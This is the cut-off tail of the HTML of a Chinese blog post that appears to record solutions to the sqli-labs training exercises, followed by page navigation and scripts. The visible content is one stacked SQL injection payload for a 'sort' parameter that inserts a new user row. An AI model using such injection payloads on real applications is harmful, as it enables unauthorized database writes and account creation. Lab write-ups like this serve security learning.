?sort=1&#x27;;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">users</span>(<span class="hljs-keyword">id</span>,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-number">53</span>,<span class="hljs-string">&#x27;Less53&#x27;</span>,<span class="hljs-string">&#x27;Less53&#x27;</span>)<span class="hljs-comment">--+</span></code></pre>




            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
                    
                  </div>
                
                
              </div>
              
                <p class="note note-warning">转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2020/01/04/xss-labs%E8%AE%B0%E5%BD%95/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">xss-labs记录</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2020/01/01/sql-labs%E8%AE%B0%E5%BD%953/">
                        <span class="hidden-mobile">sql-labs记录3</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <!-- <div>
      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
        <span>Fluid</span></a>
    </div> -->
    
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            <span id="busuanzi_value_site_pv"></span>
             次
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            <span id="busuanzi_value_site_uv"></span>
             人
          </span>
      
    
  </div>


    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/main.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
  <script  src="/js/clipboard-use.js" ></script>



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '#post-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "sql-labs记录2&nbsp;",
      ],
      cursorChar: "",
      typeSpeed: 100,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>







  
  
    <script>
      !function (e, t, a) {
        function r() {
          for (var e = 0; e < s.length; e++) s[e].alpha <= 0 ? (t.body.removeChild(s[e].el), s.splice(e, 1)) : (s[e].y--, s[e].scale += .004, s[e].alpha -= .013, s[e].el.style.cssText = "left:" + s[e].x + "px;top:" + s[e].y + "px;opacity:" + s[e].alpha + ";transform:scale(" + s[e].scale + "," + s[e].scale + ") rotate(45deg);background:" + s[e].color + ";z-index:99999");
          requestAnimationFrame(r)
        }

        function n() {
          var t = "function" == typeof e.onclick && e.onclick;
          e.onclick = function (e) {
            t && t(), o(e)
          }
        }

        function o(e) {
          var a = t.createElement("div");
          a.className = "heart", s.push({
            el: a,
            x: e.clientX - 5,
            y: e.clientY - 5,
            scale: 1,
            alpha: 1,
            color: c()
          }), t.body.appendChild(a)
        }

        function i(e) {
          var a = t.createElement("style");
          a.type = "text/css";
          try {
            a.appendChild(t.createTextNode(e))
          } catch (t) {
            a.styleSheet.cssText = e
          }
          t.getElementsByTagName("head")[0].appendChild(a)
        }

        function c() {
          return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
        }

        var s = [];
        e.requestAnimationFrame = e.requestAnimationFrame || e.webkitRequestAnimationFrame || e.mozRequestAnimationFrame || e.oRequestAnimationFrame || e.msRequestAnimationFrame || function (e) {
          setTimeout(e, 1e3 / 60)
        }, i(".heart{width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;}.heart:after{top: -5px;}.heart:before{left: -5px;}"), n(), r()
      }(window, document);
    </script>
  














</body>
</html>
